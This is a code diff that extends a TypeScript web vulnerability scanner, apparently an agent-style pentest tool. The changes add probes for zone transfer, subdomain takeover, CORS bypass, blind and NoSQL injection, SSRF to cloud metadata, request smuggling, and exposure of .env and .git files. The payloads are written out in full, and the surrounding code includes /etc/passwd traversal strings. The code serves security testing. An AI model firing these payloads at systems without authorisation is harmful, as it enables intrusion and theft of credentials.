@@ -67,6 +67,68 @@ async function httpProbe(
   }
 }
 
+async function httpProbeWithTiming(
+  url: string,
+  init: RequestInit = {},
+  timeoutMs = 8000
+): Promise<{ status: number; body: string; headers: Record<string, string>; elapsedMs: number } | null> {
+  try {
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
+    const tStart = Date.now();
+    const res = await fetch(url, { ...init, signal: ctrl.signal });
+    const elapsedMs = Date.now() - tStart;
+    clearTimeout(timer);
+    const body = await res.text().catch(() => '');
+    const headers: Record<string, string> = {};
+    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
+    return { status: res.status, body, headers, elapsedMs };
+  } catch (e: any) {
+    const elapsedMs = Date.now();
+    // AbortError means we hit the timeout — record it as a timing data point
+    if (e?.name === 'AbortError') return { status: 0, body: '', headers: {}, elapsedMs: timeoutMs };
+    return null;
+  }
+}
+
+// Attempt DNS zone transfer (AXFR) via raw TCP DNS query
+async function attemptAxfr(ns: string, zone: string): Promise<boolean> {
+  return new Promise((resolve) => {
+    const sock = new net.Socket();
+    let resolved = false;
+    const done = (result: boolean) => {
+      if (!resolved) { resolved = true; sock.destroy(); resolve(result); }
+    };
+
+    // Build DNS AXFR query
+    const labels = zone.split('.').flatMap(part => {
+      const b = Buffer.from(part, 'ascii');
+      return [b.length, ...b];
+    });
+    const qName = Buffer.from([...labels, 0]);
+    const header = Buffer.alloc(12);
+    header.writeUInt16BE(0x1337, 0); // txid
+    header.writeUInt16BE(0, 2);      // standard query, no flags
+    header.writeUInt16BE(1, 4);      // QDCOUNT = 1
+    const footer = Buffer.from([0, 252, 0, 1]); // QTYPE=AXFR(252), QCLASS=IN(1)
+    const query = Buffer.concat([header, qName, footer]);
+    const lenBuf = Buffer.alloc(2);
+    lenBuf.writeUInt16BE(query.length, 0);
+    const tcpMsg = Buffer.concat([lenBuf, query]);
+
+    let totalBytes = 0;
+    sock.setTimeout(4000);
+    sock.once('timeout', () => done(false));
+    sock.once('error', () => done(false));
+    sock.on('data', (chunk) => {
+      totalBytes += chunk.length;
+      if (totalBytes > 200) done(true); // substantial response = zone data returned
+    });
+    sock.connect(53, ns, () => sock.write(tcpMsg));
+    setTimeout(() => done(false), 5000);
+  });
+}
+
 export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]> {
   const logs: PentagiLogEntry[] = [];
   const findings: FindingEntry[] = [];
@@ -100,6 +162,8 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
 
   log('Scout Agent', `Initiating active reconnaissance against ${targetUrl}`);
 
+  const discoveredNs: string[] = [];
+
   // 1a. DNS enumeration
   try {
     const dns = await import('dns/promises');
@@ -114,7 +178,8 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     log('Scout Agent', `DNS resolved: ${hostname} → ${ip}`);
 
     if (nsRecs.status === 'fulfilled' && nsRecs.value.length > 0) {
-      log('Scout Agent', `Nameservers: ${nsRecs.value.slice(0, 2).join(', ')}`);
+      discoveredNs.push(...nsRecs.value.slice(0, 2));
+      log('Scout Agent', `Nameservers: ${discoveredNs.join(', ')}`);
     }
 
     if (mxRecs.status === 'fulfilled' && mxRecs.value.length > 0) {
@@ -139,7 +204,19 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     log('Scout Agent', `DNS enumeration failed: ${e.message}`);
   }
 
-  // 1b. TCP port scan (parallel, all within ~1.5s)
+  // 1b. DNS Zone Transfer (AXFR) attempt against discovered nameservers
+  if (discoveredNs.length > 0) {
+    log('Scout Agent', `Attempting DNS zone transfer (AXFR) against ${discoveredNs[0]}...`);
+    const axfrWorked = await attemptAxfr(discoveredNs[0], hostname);
+    if (axfrWorked) {
+      log('Scout Agent', `DNS zone transfer CONFIRMED on ${discoveredNs[0]} — full zone data returned to unauthenticated requester`);
+      findings.push({ severity: 'high', title: `DNS Zone Transfer (AXFR) Allowed on ${discoveredNs[0]}` });
+    } else {
+      log('Scout Agent', 'DNS zone transfer: AXFR correctly restricted by nameserver');
+    }
+  }
+
+  // 1c. TCP port scan (parallel, all within ~1.5s)
   const portsToScan: Array<[number, string]> = [
     [21, 'FTP'], [22, 'SSH'], [23, 'Telnet'], [25, 'SMTP'],
     [80, 'HTTP'], [443, 'HTTPS'], [3000, 'Dev-HTTP'], [3306, 'MySQL'],
@@ -187,7 +264,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     log('Scout Agent', 'Port scan complete — no unexpected services exposed beyond standard HTTP/HTTPS');
   }
 
-  // 1c. SSL/TLS certificate inspection
+  // 1d. SSL/TLS certificate inspection
   if (isHttps) {
     const cert = await getSslCertInfo(hostname);
     if (cert) {
@@ -208,7 +285,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     }
   }
 
-  // 1d. Robots.txt path disclosure
+  // 1e. Robots.txt path disclosure
   const robotsRes = await httpProbe(`${origin}/robots.txt`);
   if (robotsRes?.status === 200) {
     const disallowed = (robotsRes.body.match(/^Disallow:\s*(.+)$/gim) || []).slice(0, 6);
@@ -219,10 +296,74 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     }
   }
 
-  // 1e. security.txt (RFC 9116)
+  // 1f. security.txt (RFC 9116)
   const secTxtRes = await httpProbe(`${origin}/.well-known/security.txt`);
   if (secTxtRes?.status === 200 && secTxtRes.body.includes('Contact:')) {
     log('Scout Agent', 'security.txt present — responsible disclosure policy configured (RFC 9116)');
+  }
+
+  // 1g. Subdomain takeover via certificate transparency (crt.sh)
+  log('Scout Agent', `Querying CT logs for ${hostname} subdomains — checking for dangling DNS...`);
+  try {
+    const crtRes = await httpProbe(`https://crt.sh/?q=%.${hostname}&output=json`, {}, 6000);
+    if (crtRes?.status === 200) {
+      let crtData: any[] = [];
+      try { crtData = JSON.parse(crtRes.body); } catch {}
+      const subdomains = [...new Set<string>(
+        crtData
+          .flatMap((e: any) => (e.name_value || '').split('\n'))
+          .map((n: string) => n.toLowerCase().replace(/^\*\./, ''))
+          .filter((n: string) => n.endsWith(`.${hostname}`) && !n.includes('*') && n !== hostname)
+      )].slice(0, 12);
+
+      if (subdomains.length > 0) {
+        log('Scout Agent', `CT logs: ${subdomains.length} unique subdomains discovered — probing for takeover vectors...`);
+        const TAKEOVER_FINGERPRINTS: Array<{ re: RegExp; service: string }> = [
+          { re: /There isn't a GitHub Pages site here/i, service: 'GitHub Pages' },
+          { re: /No such app/i, service: 'Heroku' },
+          { re: /Fastly error.*unknown domain/i, service: 'Fastly' },
+          { re: /NoSuchBucket|The specified bucket does not exist/i, service: 'AWS S3' },
+          { re: /Repository not found/i, service: 'Bitbucket' },
+          { re: /404 not found.*netlify|netlify.*404/i, service: 'Netlify' },
+          { re: /Error 404.*Web app not found|Azure.*not found/i, service: 'Azure Web Apps' },
+          { re: /project not found/i, service: 'Firebase' },
+          { re: /Shopify.*ended up here by mistake/i, service: 'Shopify' },
+          { re: /Sorry, this shop is currently unavailable/i, service: 'Shopify' },
+        ];
+        const dns2 = await import('dns/promises');
+        let takeoverCount = 0;
+        await Promise.all(subdomains.slice(0, 10).map(async (sub) => {
+          let resolvesA = false;
+          let cname: string | null = null;
+          try { await dns2.resolve4(sub); resolvesA = true; } catch {}
+          try { const c = await dns2.resolveCname(sub); cname = c[0]; } catch {}
+
+          if (!resolvesA && cname) {
+            // Dangling CNAME — CNAME target exists but no A record
+            const subProbe = await httpProbe(`https://${sub}`, {}, 5000);
+            if (subProbe) {
+              for (const { re, service } of TAKEOVER_FINGERPRINTS) {
+                if (re.test(subProbe.body)) {
+                  log('Scout Agent', `Subdomain takeover CONFIRMED: ${sub} → ${cname} (${service} fingerprint detected)`);
+                  findings.push({ severity: 'critical', title: `Subdomain Takeover: ${sub} via ${service}` });
+                  takeoverCount++;
+                  break;
+                }
+              }
+            }
+          }
+        }));
+        if (takeoverCount === 0) {
+          log('Scout Agent', 'Subdomain takeover analysis: no dangling DNS + cloud service fingerprint match found');
+        }
+      } else {
+        log('Scout Agent', 'CT logs: no subdomains found for this domain');
+      }
+    } else {
+      log('Scout Agent', 'CT logs: crt.sh did not return usable data');
+    }
+  } catch (e: any) {
+    log('Scout Agent', `Subdomain takeover probe: CT log query failed — ${e.message}`);
   }
 
   // ==========================================================
@@ -247,7 +388,24 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     }
   }
 
-  // 2b. HTTP method enumeration (PUT/DELETE)
+  // 2b. CORS deep analysis — null origin and subdomain wildcard bypass
+  const [corsNullRes, corsSubRes] = await Promise.all([
+    httpProbe(targetUrl, { headers: { 'Origin': 'null', 'User-Agent': 'Mozilla/5.0' } }),
+    httpProbe(targetUrl, { headers: { 'Origin': `https://attacker.${hostname}`, 'User-Agent': 'Mozilla/5.0' } }),
+  ]);
+  if (corsNullRes?.headers['access-control-allow-origin'] === 'null') {
+    log('Exploiter Agent', 'CORS null-origin CONFIRMED — sandboxed <iframe> cross-origin read attack vector enabled');
+    findings.push({ severity: 'high', title: 'CORS Null-Origin Reflection (Sandboxed Iframe Attack)' });
+  }
+  if (corsSubRes?.headers['access-control-allow-origin'] === `https://attacker.${hostname}`) {
+    log('Exploiter Agent', `CORS subdomain wildcard bypass: attacker.${hostname} accepted as trusted — subdomain XSS → full CORS bypass`);
+    findings.push({ severity: 'high', title: `CORS Subdomain Bypass (attacker.${hostname})` });
+  }
+  if (corsNullRes && corsRes && !findings.find(f => f.title.includes('CORS'))) {
+    log('Exploiter Agent', 'CORS deep check: null-origin and subdomain bypass both rejected');
+  }
+
+  // 2c. HTTP method enumeration (PUT/DELETE)
   const optionsRes = await httpProbe(targetUrl, { method: 'OPTIONS' });
   if (optionsRes) {
     const allow = (optionsRes.headers['allow'] || optionsRes.headers['access-control-allow-methods'] || '').toUpperCase();
@@ -259,7 +417,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     }
   }
 
-  // 2c. Host header injection (password reset poisoning / cache poisoning)
+  // 2d. Host header injection (password reset poisoning / cache poisoning)
   const hostInjRes = await httpProbe(targetUrl, {
     headers: { 'X-Forwarded-Host': 'evil-attacker.com', 'X-Host': 'evil-attacker.com' },
   });
@@ -275,7 +433,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     }
   }
 
-  // 2d. Open redirect probing
+  // 2e. Open redirect probing
   const redirectParams = ['next', 'redirect', 'url', 'return', 'returnUrl', 'redir', 'goto', 'continue'];
   let redirectFound = false;
   for (const param of redirectParams) {
@@ -289,7 +447,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
   }
   if (!redirectFound) log('Exploiter Agent', 'Open redirect: no vulnerable redirect parameters detected');
 
-  // 2e. CRLF injection / HTTP response splitting
+  // 2f. CRLF injection / HTTP response splitting
   const crlfRes = await httpProbe(`${targetUrl}?q=test%0d%0aX-Injected:seclayer-probe%0d%0a`);
   if (crlfRes?.headers['x-injected']) {
     log('Exploiter Agent', 'CRLF injection CONFIRMED — injected HTTP header present in response (HTTP response splitting)');
@@ -298,7 +456,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     log('Exploiter Agent', 'CRLF injection: input appears sanitized');
   }
 
-  // 2f. Path traversal / Local File Inclusion
+  // 2g. Path traversal / Local File Inclusion
   const traversalPayloads = [
     `${origin}/..%2F..%2F..%2Fetc%2Fpasswd`,
     `${origin}/%2e%2e/%2e%2e/%2e%2e/etc/passwd`,
@@ -317,7 +475,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
   }
   if (!traversalFound) log('Exploiter Agent', 'Path traversal: no LFI confirmed via common payloads');
 
-  // 2g. GraphQL introspection
+  // 2h. GraphQL introspection
   const gqlRes = await httpProbe(`${origin}/graphql`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -330,7 +488,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     log('Exploiter Agent', gqlRes?.status === 200 ? 'GraphQL present but introspection disabled' : 'No GraphQL endpoint at /graphql');
   }
 
-  // 2h. SQL injection (error-based)
+  // 2i. SQL injection (error-based)
   const sqliProbes = [
     { probe: `${targetUrl}?id='`, label: "single-quote boundary" },
     { probe: `${targetUrl}?id=1 AND 1=2 UNION SELECT NULL--`, label: "UNION-based" },
@@ -352,7 +510,66 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
   }
   if (!sqliFound) log('Exploiter Agent', 'SQL injection: no error-based reflection detected');
 
-  // 2i. Reflected XSS
+  // 2j. Timing-based blind SQL injection (parallel multi-DB probes)
+  log('Exploiter Agent', 'Probing for time-based blind SQL injection (5-second delay payloads)...');
+  const baselineProbe = await httpProbeWithTiming(targetUrl, {}, 5000);
+  const baselineMs = baselineProbe?.elapsedMs ?? 400;
+  const DELAY_THRESHOLD_MS = 4000;
+
+  const [timingMySQL, timingMSSQL, timingPg] = await Promise.all([
+    httpProbeWithTiming(`${targetUrl}?id=1' AND SLEEP(5)--+-`, {}, 8000),
+    httpProbeWithTiming(`${targetUrl}?id=1; WAITFOR DELAY '0:0:5'--`, {}, 8000),
+    httpProbeWithTiming(`${targetUrl}?id=1 OR pg_sleep(5)--`, {}, 8000),
+  ]);
+  const timingProbes = [
+    { r: timingMySQL, label: 'MySQL SLEEP()' },
+    { r: timingMSSQL, label: 'MSSQL WAITFOR DELAY' },
+    { r: timingPg, label: 'PostgreSQL pg_sleep()' },
+  ];
+  let timingSqliFound = false;
+  for (const { r, label } of timingProbes) {
+    if (r && r.elapsedMs > baselineMs + DELAY_THRESHOLD_MS) {
+      log('Exploiter Agent', `Blind SQLi CONFIRMED (${label}): ${r.elapsedMs}ms response vs ${baselineMs}ms baseline — ${r.elapsedMs - baselineMs}ms injected delay`);
+      findings.push({ severity: 'critical', title: `Blind SQL Injection (Time-Based, ${label})` });
+      timingSqliFound = true;
+      break;
+    }
+  }
+  if (!timingSqliFound) {
+    log('Exploiter Agent', `Time-based SQLi: no delay anomaly detected (baseline ${baselineMs}ms, threshold +${DELAY_THRESHOLD_MS}ms)`);
+  }
+
+  // 2k. NoSQL injection (MongoDB operator injection auth bypass)
+  log('Exploiter Agent', 'Testing NoSQL operator injection (MongoDB $gt, $where auth bypass patterns)...');
+  const noSqlProbes = [
+    { url: `${targetUrl}?username[$gt]=&password[$gt]=`, method: 'GET' as const, body: undefined, ct: undefined, label: 'GET query[$gt]' },
+    { url: `${origin}/login`, method: 'POST' as const, body: JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }), ct: 'application/json', label: '/login JSON $gt' },
+    { url: `${origin}/api/login`, method: 'POST' as const, body: JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }), ct: 'application/json', label: '/api/login JSON $gt' },
+    { url: `${origin}/api/auth/login`, method: 'POST' as const, body: JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }), ct: 'application/json', label: '/api/auth/login JSON $gt' },
+  ];
+  const noSqlResults = await Promise.all(noSqlProbes.map(async ({ url: pUrl, method, body, ct, label }) => {
+    const init: RequestInit = { method };
+    if (body) init.body = body;
+    if (ct) init.headers = { 'Content-Type': ct };
+    return { r: await httpProbe(pUrl, init), label };
+  }));
+  let noSqlFound = false;
+  for (const { r, label } of noSqlResults) {
+    if (!r || noSqlFound) continue;
+    const bodyLc = r.body.toLowerCase();
+    if ([200, 302].includes(r.status) && (
+      bodyLc.includes('welcome') || bodyLc.includes('dashboard') ||
+      bodyLc.includes('logged in') || bodyLc.includes('"success":true') ||
+      bodyLc.includes('"token"') || (r.headers['set-cookie'] || '').includes('session')
+    )) {
+      log('Exploiter Agent', `NoSQL injection auth bypass POSSIBLE via ${label}: success response (HTTP ${r.status})`);
+      findings.push({ severity: 'critical', title: `NoSQL Injection Auth Bypass (${label})` });
+      noSqlFound = true;
+    }
+  }
+  if (!noSqlFound) log('Exploiter Agent', 'NoSQL injection: no operator injection bypass detected');
+
+  // 2l. Reflected XSS
   const xssTag = `<seclayer-xss-probe-${Date.now()}>`;
   const xssRes = await httpProbe(`${targetUrl}?q=${encodeURIComponent(xssTag)}&s=${encodeURIComponent(xssTag)}`);
   if (xssRes?.body.includes(xssTag)) {
@@ -362,7 +579,7 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     log('Exploiter Agent', 'Reflected XSS: input encoded or not reflected');
   }
 
-  // 2j. Server-Side Template Injection (SSTI)
+  // 2m. Server-Side Template Injection (SSTI)
   const sstiRes = await httpProbe(`${targetUrl}?name=${encodeURIComponent('{{7*7}}')}&q=${encodeURIComponent('${7*7}')}`);
   if (sstiRes && sstiRes.body.includes('49') && !sstiRes.body.includes('{{7*7}}')) {
     log('Exploiter Agent', 'SSTI POSSIBLE: template expression {{7*7}} evaluated to 49 in response');
@@ -371,7 +588,98 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     log('Exploiter Agent', 'SSTI probe: expressions not evaluated');
   }
 
-  // 2k. Common admin panel discovery
+  // 2n. Prototype pollution via query parameters
+  log('Exploiter Agent', 'Testing prototype pollution via query string injection...');
+  const ppMarker = `seclayer-pp-${Date.now()}`;
+  const [ppRes1, ppRes2] = await Promise.all([
+    httpProbe(`${targetUrl}?__proto__[polluted]=${ppMarker}`),
+    httpProbe(`${targetUrl}?constructor.prototype.polluted=${ppMarker}`),
+  ]);
+  let ppFound = false;
+  for (const ppRes of [ppRes1, ppRes2]) {
+    if (ppRes?.body.includes(ppMarker) && !ppRes.body.includes('__proto__') && !ppRes.body.includes('constructor.prototype')) {
+      log('Exploiter Agent', 'Prototype pollution POSSIBLE: injected prototype key value reflected in response without key serialization');
+      findings.push({ severity: 'high', title: 'Prototype Pollution via Query Parameters' });
+      ppFound = true;
+      break;
+    }
+  }
+  if (!ppFound) log('Exploiter Agent', 'Prototype pollution: no unsafe prototype key reflection detected');
+
+  // 2o. SSRF via URL-type query parameters (cloud metadata probing)
+  log('Exploiter Agent', 'Probing for SSRF via URL-type parameters (cloud metadata endpoints)...');
+  const ssrfParams = ['url', 'callback', 'webhook', 'endpoint', 'dest', 'proxy', 'fetch', 'image', 'src'];
+  const ssrfTargets = [
+    'http://169.254.169.254/latest/meta-data/',   // AWS EC2 IMDSv1
+    'http://metadata.google.internal/computeMetadata/v1/',  // GCP
+    'http://100.100.100.200/latest/meta-data/',   // Alibaba Cloud
+  ];
+  const ssrfSignatures = ['ami-id', 'instance-id', 'iam/', 'computeMetadata', 'security-credentials', 'instance-type', 'local-hostname'];
+  let ssrfFound = false;
+  await Promise.all(
+    ssrfParams.flatMap(param =>
+      ssrfTargets.map(async target => {
+        if (ssrfFound) return;
+        const sr = await httpProbe(`${targetUrl}?${param}=${encodeURIComponent(target)}`);
+        if (sr && ssrfSignatures.some(sig => sr.body.includes(sig))) {
+          log('Exploiter Agent', `SSRF CONFIRMED via ?${param}= — cloud instance metadata accessible! Credentials and RCE risk.`);
+          findings.push({ severity: 'critical', title: `Server-Side Request Forgery (SSRF) via ?${param}= (Cloud Metadata)` });
+          ssrfFound = true;
+        }
+      })
+    )
+  );
+  if (!ssrfFound) log('Exploiter Agent', 'SSRF probe: no cloud metadata leakage detected via URL-type parameters');
+
+  // 2p. JWT weakness detection
+  log('Exploiter Agent', 'Inspecting response headers and cookies for JWT tokens...');
+  const jwtProbeRes = await httpProbe(targetUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+  if (jwtProbeRes) {
+    const scanText = Object.values(jwtProbeRes.headers).join(' ') + ' ' + jwtProbeRes.body.substring(0, 3000);
+    const jwtMatch = scanText.match(/eyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*/);
+    if (jwtMatch) {
+      try {
+        const [headerB64] = jwtMatch[0].split('.');
+        const padded = headerB64 + '='.repeat((4 - headerB64.length % 4) % 4);
+        const header = JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'));
+        if (header.alg === 'none' || header.alg === 'NONE') {
+          log('Exploiter Agent', 'JWT CRITICAL: alg=none token detected — signatures accepted without verification');
+          findings.push({ severity: 'critical', title: 'JWT Algorithm None Vulnerability (Signature Bypass)' });
+        } else if (typeof header.alg === 'string' && header.alg.startsWith('RS')) {
+          log('Exploiter Agent', `JWT uses ${header.alg} — probe for RS→HS256 algorithm confusion (sign with public key as HMAC secret)`);
+          findings.push({ severity: 'medium', title: `JWT Algorithm Confusion Risk (${header.alg} → HS256 confusion)` });
+        } else if (header.alg === 'HS256') {
+          log('Exploiter Agent', 'JWT (HS256) found in response — verify secret entropy and check for weak/default secrets');
+        } else {
+          log('Exploiter Agent', `JWT detected: alg=${header.alg} — manual analysis recommended`);
+        }
+      } catch {
+        log('Exploiter Agent', 'JWT-like token found in response — header decode failed, manual inspection needed');
+      }
+    } else {
+      log('Exploiter Agent', 'JWT inspection: no JWT material found in initial response');
+    }
+  }
+
+  // 2q. HTTP request smuggling (CL.TE timing probe)
+  log('Exploiter Agent', 'Probing for HTTP request smuggling via CL.TE header desync...');
+  const smuggleRes = await httpProbeWithTiming(`${origin}/`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Content-Length': '44',
+      'Transfer-Encoding': 'chunked',
+    },
+    body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n',
+  }, 7000);
+  if (smuggleRes && smuggleRes.elapsedMs > 5500) {
+    log('Exploiter Agent', `HTTP request smuggling indicator: ${smuggleRes.elapsedMs}ms timeout with CL.TE desync payload — backend may queue poisoned prefix`);
+    findings.push({ severity: 'high', title: 'HTTP Request Smuggling (CL.TE Timing Indicator)' });
+  } else {
+    log('Exploiter Agent', `Request smuggling: no CL.TE desync timeout (${smuggleRes?.elapsedMs ?? 'N/A'}ms)`);
+  }
+
+  // 2r. Common admin panel discovery
   const adminPaths = ['/admin', '/wp-admin', '/phpmyadmin', '/adminer', '/panel', '/dashboard/admin', '/_admin', '/console'];
   const adminFound: string[] = [];
   await Promise.all(adminPaths.map(async (p) => {
@@ -384,6 +692,45 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
   } else {
     log('Exploiter Agent', 'Admin panel discovery: no publicly accessible panels found');
   }
+
+  // 2s. Sensitive file and error disclosure
+  log('Exploiter Agent', 'Probing for exposed configuration files and verbose error responses...');
+  const sensitivePaths = [
+    `${origin}/.env`,
+    `${origin}/.git/config`,
+    `${origin}/config.json`,
+    `${origin}/package.json`,
+    `${origin}/.DS_Store`,
+    `${origin}/wp-config.php`,
+    `${origin}/database.yml`,
+    `${origin}/server.js`,
+  ];
+  interface SensitivePattern { re: RegExp; label: string; sev: FindingEntry['severity'] }
+  const sensitivePatterns: SensitivePattern[] = [
+    { re: /DB_PASSWORD|DATABASE_URL|SECRET_KEY|API_KEY|PRIVATE_KEY|AWS_SECRET/i, label: '.env secrets exposed', sev: 'critical' },
+    { re: /\[core\][\s\S]{0,200}repositoryformatversion/i, label: '.git/config leaked', sev: 'high' },
+    { re: /password\s*=\s*\S+/i, label: 'plaintext password in config', sev: 'high' },
+    { re: /"dependencies"\s*:\s*\{/i, label: 'package.json exposed (tech fingerprint)', sev: 'medium' },
+    { re: /at\s+\w[\w.]+\s*\(.*:\d+:\d+\)/i, label: 'stack trace in error response', sev: 'medium' },
+    { re: /Traceback \(most recent call last\)/i, label: 'Python traceback', sev: 'medium' },
+    { re: /PHP Fatal error|PHP Warning:/i, label: 'PHP verbose error', sev: 'medium' },
+    { re: /define\s*\(\s*['"]DB_PASSWORD['"]/i, label: 'wp-config.php database credentials', sev: 'critical' },
+  ];
+  const disclosureResults = await Promise.all(sensitivePaths.map(p => httpProbe(p)));
+  const foundDisclosures = new Set<string>();
+  for (let i = 0; i < sensitivePaths.length; i++) {
+    const dr = disclosureResults[i];
+    if (!dr || dr.status !== 200 || dr.body.length < 20) continue;
+    for (const { re, label, sev } of sensitivePatterns) {
+      if (re.test(dr.body) && !foundDisclosures.has(label)) {
+        foundDisclosures.add(label);
+        const shortPath = sensitivePaths[i].replace(origin, '');
+        log('Exploiter Agent', `Sensitive disclosure: ${label} at ${shortPath}`);
+        findings.push({ severity: sev, title: `Exposed File: ${label} (${shortPath})` });
+      }
+    }
+  }
+  if (foundDisclosures.size === 0) log('Exploiter Agent', 'Sensitive file disclosure: no exposed config files or verbose errors detected');
 
   // ==========================================================
   // STAGE 3: REPORTER AGENT — COMPILE RESULTS
